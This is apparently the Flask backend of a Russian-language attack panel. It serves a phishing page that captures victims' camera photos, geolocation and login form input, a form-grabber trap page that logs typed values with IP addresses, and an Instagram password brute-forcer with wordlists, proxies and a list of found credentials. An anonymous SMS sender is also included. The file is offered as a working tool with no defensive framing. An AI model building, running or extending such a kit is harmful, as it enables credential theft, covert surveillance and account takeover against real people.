"""
Точка входа backend: API для панели. Не содержит логики инструментов — только маршруты и вызовы.
"""
import json
import os
import sys
from urllib.parse import quote

# Запуск из корня проекта: python backend/app.py
_BACKEND_DIR = os.path.dirname(os.path.abspath(__file__))
if _BACKEND_DIR not in sys.path:
    sys.path.insert(0, _BACKEND_DIR)

from flask import Flask, request, jsonify, send_from_directory, Response
from flask_cors import CORS

from datetime import datetime, timezone, timedelta

from db import init_db, save_run, get_run_history, get_last_successful_run
from tools import get_all_tools, get_tool, run_tool
from tools.tool_formgrab import add_capture, get_captures, get_grab_page_html, get_or_create_token
from settings_keys import get_keys_for_api, save_keys_from_api, load_env_into_os

app = Flask(__name__, static_folder="../static", static_url_path="")
CORS(app)

# Инициализация БД и загрузка ключей из .env при старте
init_db()
load_env_into_os()


@app.route("/")
def index():
    return send_from_directory(app.static_folder, "index.html")


# Страница-ловушка для захвата ввода в формах (Form Grabber)
@app.route("/grab/<token>")
def grab_page(token):
    html = get_grab_page_html(token)
    return Response(html, mimetype="text/html; charset=utf-8")


@app.route("/<path:path>")
def static_files(path):
    return send_from_directory(app.static_folder, path)


# --- API ---

@app.route("/api/tools", methods=["GET"])
def api_tools_list():
    """Список доступных инструментов."""
    return jsonify(get_all_tools())


@app.route("/api/tools/<tool_id>/run", methods=["POST"])
def api_tool_run(tool_id):
    """Запуск инструмента. Body: JSON с параметрами. При неизвестном tool_id — 404 с error."""
    data = request.get_json(silent=True) or {}
    result = run_tool(tool_id, data)
    if not result.get("started"):
        save_run(tool_id, data, result if result.get("success") else None, result.get("error"))
    if tool_id == "grabcam" and result.get("local_url"):
        host = (request.host or "127.0.0.1:5000").split(":")[0]
        result["local_url"] = "http://{}:3333".format(host)
    if not result.get("success") and result.get("error") == f"Unknown tool: {tool_id}":
        return jsonify({"error": result["error"]}), 404
    return jsonify(result)


@app.route("/api/history", methods=["GET"])
def api_history():
    """История запусков. Query: ?tool_id=anonsms (опционально), ?limit=50."""
    tool_id = request.args.get("tool_id")
    limit = min(int(request.args.get("limit", 50) or 50), 200)
    return jsonify(get_run_history(tool_id=tool_id, limit=limit))


@app.route("/api/tools/anonsms/status", methods=["GET"])
def api_anonsms_status():
    """Можно ли отправить бесплатное SMS (24 ч после последней успешной отправки)."""
    last = get_last_successful_run("anonsms")
    if not last:
        return jsonify({"canSend": True, "nextSmsAt": None})
    # SQLite: created_at как 'YYYY-MM-DD HH:MM:SS'
    try:
        created = datetime.strptime(last["created_at"], "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
    except (ValueError, TypeError):
        created = datetime.now(timezone.utc)
    next_at = created + timedelta(hours=24)
    now = datetime.now(timezone.utc)
    if now >= next_at:
        return jsonify({"canSend": True, "nextSmsAt": None})
    return jsonify({"canSend": False, "nextSmsAt": next_at.isoformat()})


@app.route("/api/tools/instagram-bruter/run-status", methods=["GET"])
def api_instagram_bruter_run_status():
    """Живой вывод и статус текущего перебора (для опроса с фронта)."""
    tool = get_tool("instagram-bruter")
    if not tool or not hasattr(tool, "get_run_status"):
        return jsonify({"output": "", "done": True, "result": None, "error": "Инструмент не найден"})
    return jsonify(tool.get_run_status())


@app.route("/api/tools/instagram-bruter/stop", methods=["POST"])
def api_instagram_bruter_stop():
    """Остановить текущий перебор."""
    tool = get_tool("instagram-bruter")
    if not tool or not hasattr(tool, "stop_run"):
        return jsonify({"success": False, "error": "Инструмент не найден"})
    ok, msg = tool.stop_run()
    return jsonify({"success": ok, "message": msg})


@app.route("/api/tools/grabcam/run-status", methods=["GET"])
def api_grabcam_run_status():
    """Статус Grabcam: ссылка Serveo или локальный URL. local_url подставляется по Host запроса для доступа из локальной сети."""
    tool = get_tool("grabcam")
    if not tool or not hasattr(tool, "get_run_status"):
        return jsonify({"running": False, "link": None, "local_url": None, "error": "Инструмент не найден"})
    data = tool.get_run_status()
    if data.get("local_url"):
        host = (request.host or "127.0.0.1:5000").split(":")[0]
        data["local_url"] = "http://{}:3333".format(host)
    return jsonify(data)


@app.route("/api/tools/grabcam/stop", methods=["POST"])
def api_grabcam_stop():
    """Остановить Grabcam (PHP/Serveo)."""
    tool = get_tool("grabcam")
    if not tool or not hasattr(tool, "stop_run"):
        return jsonify({"success": False, "error": "Инструмент не найден"})
    ok, msg = tool.stop_run()
    return jsonify({"success": ok, "message": msg})


# Корень проекта = родитель папки backend (app.py лежит в backend/app.py)
_PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_GRABCAM_PHOTO_DIR = os.path.join(_PROJECT_ROOT, "tools", "grabcam", "Photo")


@app.route("/api/tools/grabcam/photos", methods=["GET"])
def api_grabcam_photos():
    """Список последних снятых фото. Только камера back (фронт убран — чёрный экран)."""
    if not os.path.isdir(_GRABCAM_PHOTO_DIR):
        return jsonify({"photos": [], "total": 0, "unique_devices": 0})
    limit = min(int(request.args.get("limit", 30) or 30), 100)
    photos = []
    for root, _, files in os.walk(_GRABCAM_PHOTO_DIR):
        for f in files:
            if f.lower().endswith((".png", ".jpg", ".jpeg")):
                full = os.path.join(root, f)
                try:
                    mtime = os.path.getmtime(full)
                except OSError:
                    mtime = 0
                rel = os.path.relpath(full, _GRABCAM_PHOTO_DIR)
                if ".." in rel or rel.startswith("/"):
                    continue
                rel_norm = rel.replace("\\", "/")
                parts = rel_norm.split("/")
                ip = parts[0] if len(parts) >= 1 else ""
                camera = parts[1] if len(parts) >= 2 else ""
                if camera != "back":
                    continue
                photos.append({"path": rel_norm, "mtime": mtime, "ip": ip, "camera": camera})
    photos.sort(key=lambda x: -x["mtime"])
    total_all = len(photos)
    unique_ips = len(set(p["ip"] for p in photos))
    photos = photos[:limit]
    for p in photos:
        p["url"] = "/api/tools/grabcam/photo?path=" + quote(p["path"], safe="")
    return jsonify({
        "photos": photos,
        "total": total_all,
        "unique_devices": unique_ips,
    })


@app.route("/api/tools/grabcam/photo", methods=["GET"])
def api_grabcam_photo():
    """Отдать одно фото из папки Photo. Query: path=IP/front/file.png"""
    photo_path = (request.args.get("path") or "").strip()
    if not photo_path or ".." in photo_path or photo_path.startswith("/") or "\\" in photo_path:
        return "", 404
    photo_path = photo_path.replace("\\", "/")
    return send_from_directory(_GRABCAM_PHOTO_DIR, photo_path)


def _parse_geo_info(content):
    """Парсит geo_info.txt в словарь."""
    d = {"ip": "", "country": "", "region": "", "city": "", "lat": "", "lon": "", "isp": "", "last_update": ""}
    for line in content.splitlines():
        line = line.strip()
        if ":" not in line:
            continue
        key, _, val = line.partition(":")
        key, val = key.strip().lower(), val.strip()
        if key == "ip":
            d["ip"] = val
        elif key == "country":
            d["country"] = val
        elif key == "region":
            d["region"] = val
        elif key == "city":
            d["city"] = val
        elif key == "latitude":
            d["lat"] = val
        elif key == "longitude":
            d["lon"] = val
        elif key == "isp":
            d["isp"] = val
        elif key == "last update":
            d["last_update"] = val
    return d


@app.route("/api/tools/grabcam/locations", methods=["GET"])
def api_grabcam_locations():
    """Список IP и местоположений из Photo/*/geo_info.txt."""
    if not os.path.isdir(_GRABCAM_PHOTO_DIR):
        return jsonify({"locations": []})
    locations = []
    for name in os.listdir(_GRABCAM_PHOTO_DIR):
        sub = os.path.join(_GRABCAM_PHOTO_DIR, name)
        if not os.path.isdir(sub) or ".." in name:
            continue
        geo_file = os.path.join(sub, "geo_info.txt")
        if not os.path.isfile(geo_file):
            continue
        try:
            with open(geo_file, "r", encoding="utf-8", errors="replace") as f:
                content = f.read()
        except OSError:
            continue
        geo = _parse_geo_info(content)
        geo["device_id"] = name
        try:
            mtime = os.path.getmtime(geo_file)
            geo["mtime"] = mtime
        except OSError:
            geo["mtime"] = 0
        locations.append(geo)
    locations.sort(key=lambda x: -x["mtime"])
    return jsonify({"locations": locations})


_GRABCAM_FORM_CAPTURES_FILE = os.path.join(_PROJECT_ROOT, "tools", "grabcam", "form_captures.json")
_GRABCAM_OPTIONS_FILE = os.path.join(_PROJECT_ROOT, "tools", "grabcam", "options.json")


@app.route("/api/tools/grabcam/options", methods=["GET"])
def api_grabcam_options_get():
    """Текущие опции (камера, гео, форма, галерея). Меняются на лету без перезапуска."""
    default = {"camera": True, "geo": True, "form": True, "gallery": False}
    if not os.path.isfile(_GRABCAM_OPTIONS_FILE):
        return jsonify(default)
    try:
        with open(_GRABCAM_OPTIONS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        for k in default:
            if k in data and isinstance(data[k], bool):
                default[k] = data[k]
    except (OSError, ValueError):
        pass
    return jsonify(default)


@app.route("/api/tools/grabcam/options", methods=["POST"])
def api_grabcam_options_post():
    """Сохранить опции. Страница фишинга подхватывает их без перезапуска."""
    data = request.get_json(silent=True) or {}
    options = {
        "camera": bool(data.get("camera", True)),
        "geo": bool(data.get("geo", True)),
        "form": bool(data.get("form", True)),
        "gallery": bool(data.get("gallery", False)),
    }
    try:
        with open(_GRABCAM_OPTIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(options, f, ensure_ascii=False, indent=2)
    except OSError:
        return jsonify({"success": False, "error": "Не удалось записать файл"}), 500
    return jsonify({"success": True, "options": options})


@app.route("/api/tools/grabcam/form-captures", methods=["GET"])
def api_grabcam_form_captures():
    """Введённые данные с формы входа на странице фишинга (одна ссылка Grabcam)."""
    limit = min(int(request.args.get("limit", 100) or 100), 500)
    captures = []
    if os.path.isfile(_GRABCAM_FORM_CAPTURES_FILE):
        try:
            with open(_GRABCAM_FORM_CAPTURES_FILE, "r", encoding="utf-8", errors="replace") as f:
                data = json.load(f)
            captures = (data.get("captures") or [])[-limit:]
            captures = list(reversed(captures))
        except (OSError, ValueError):
            pass
    return jsonify({"captures": captures})


@app.route("/api/tools/instagram-bruter/tried-count", methods=["GET"])
def api_instagram_bruter_tried_count():
    """Количество уже проверенных паролей для аккаунта (?username=xxx)."""
    from db import get_instagram_tried_count
    username = (request.args.get("username") or "").strip()
    return jsonify({"count": get_instagram_tried_count(username)})


@app.route("/api/tools/instagram-bruter/clear-tried", methods=["POST"])
def api_instagram_bruter_clear_tried():
    """Сбросить учёт проверенных паролей для аккаунта (чтобы можно было повторить те же пароли)."""
    from db import clear_instagram_tried_passwords
    data = request.get_json(silent=True) or {}
    username = (data.get("username") or "").strip()
    if not username:
        return jsonify({"success": False, "error": "Укажите имя аккаунта."})
    clear_instagram_tried_passwords(username)
    return jsonify({"success": True, "message": "Проверенные пароли для этого аккаунта сброшены."})


@app.route("/api/tools/instagram-bruter/found-list", methods=["GET"])
def api_instagram_bruter_found_list():
    """Список найденных учёток (логин/пароль) для отображения в панели."""
    from db import get_instagram_found_list
    limit = min(int(request.args.get("limit", 50) or 50), 200)
    return jsonify({"found": get_instagram_found_list(limit=limit)})


@app.route("/api/tools/instagram-bruter/refresh-lists", methods=["POST"])
def api_instagram_bruter_refresh_lists():
    """Скачать и сохранить списки паролей и прокси для офлайн-работы."""
    tool = get_tool("instagram-bruter")
    if not tool:
        return jsonify({"success": False, "error": "Инструмент не найден"})
    ok_w, msg_w = tool.download_wordlist()
    ok_p, msg_p = tool.refresh_proxy_list()
    return jsonify({
        "success": ok_w and ok_p,
        "wordlist": {"ok": ok_w, "message": msg_w},
        "proxies": {"ok": ok_p, "message": msg_p},
    })


# --- Form Grabber ---
@app.route("/api/tools/formgrab/url", methods=["GET"])
def api_formgrab_url():
    """Создать новую ссылку для захвата форм. Возвращает token и url."""
    token = get_or_create_token()
    url = request.host_url.rstrip("/") + "/grab/" + token
    return jsonify({"token": token, "url": url})


@app.route("/api/tools/formgrab/capture", methods=["POST"])
def api_formgrab_capture():
    """Принять введённые данные с страницы-ловушки."""
    data = request.get_json(silent=True) or {}
    token = (data.get("token") or "").strip()
    field = (data.get("field") or "").strip()
    value = (data.get("value") or "").strip()
    ip = request.remote_addr or ""
    if not token:
        return jsonify({"success": False, "error": "token required"}), 400
    add_capture(token, field, value, ip)
    return jsonify({"success": True})


@app.route("/api/tools/formgrab/captures", methods=["GET"])
def api_formgrab_captures():
    """Список захваченных вводов для токена."""
    token = (request.args.get("token") or "").strip()
    limit = min(int(request.args.get("limit", 100) or 100), 500)
    if not token:
        return jsonify({"captures": []})
    return jsonify({"captures": get_captures(token, limit=limit)})


@app.route("/api/settings/keys", methods=["GET"])
def api_settings_keys_get():
    """Список ключей с подсказками и замаскированными значениями."""
    return jsonify(get_keys_for_api())


@app.route("/api/settings/keys", methods=["POST"])
def api_settings_keys_post():
    """Сохранить ключи в .env. Body: { "TEXTBELT_API_KEY": "xxx", ... }."""
    data = request.get_json(silent=True) or {}
    save_keys_from_api(data)
    load_env_into_os()
    return jsonify({"success": True})


if __name__ == "__main__":
    os.makedirs(os.path.join(os.path.dirname(__file__), "..", "static"), exist_ok=True)
    app.run(host="0.0.0.0", port=5000, debug=True)
